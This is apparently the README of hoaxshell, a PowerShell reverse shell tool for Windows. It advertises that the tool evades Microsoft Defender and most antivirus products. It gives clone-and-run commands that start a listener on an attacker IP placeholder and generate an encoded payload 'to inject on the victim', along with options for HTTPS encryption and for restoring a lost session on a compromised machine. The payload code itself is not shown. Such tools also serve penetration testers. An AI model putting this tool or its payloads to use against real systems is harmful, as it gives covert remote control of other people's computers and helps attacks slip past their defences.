# hoaxshell

[![Python 3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue">
[![License](https://img.shields.io/badge/license-MIT-red.svg)](https://github.com/t3l3machus/hoaxshell/blob/main/LICENSE)
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">
## Purpose

hoaxshell is a non-traditional windows reverse shell (powershell), currently undetected by Microsoft Defender and most other AV solutions, as it is solely based on http/https traffic. The tool is easy to use, it produces it's own powershell base64 encoded or raw payload, it supports session restoration and encryption (ssl).  
  
**Disclaimer**: The project is quite fresh and has not been widely tested.  
  
### Video Presentation  
https://www.youtube.com/

## Screenshots
![usage_example_png](https://raw.github.com/t3l3machus/hoaxshell/master/Screenshots/hoaxshell-1.png)
  
Find more screenshots [here](Screenshots/).

## Installation
```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

## Usage
#### Basic (shell session over http)
```
sudo python3 hoaxshell.py -s <your_ip>
```  
hoaxshell will generate the powershell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run powershell commands against it.

#### Encrypted shell session (https):
```
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c cert.pem -k key.pem

```  

#### Restore session mode
In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in restore mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
```
sudo python3 hoaxshell.py -s <your_ip> -g
```  



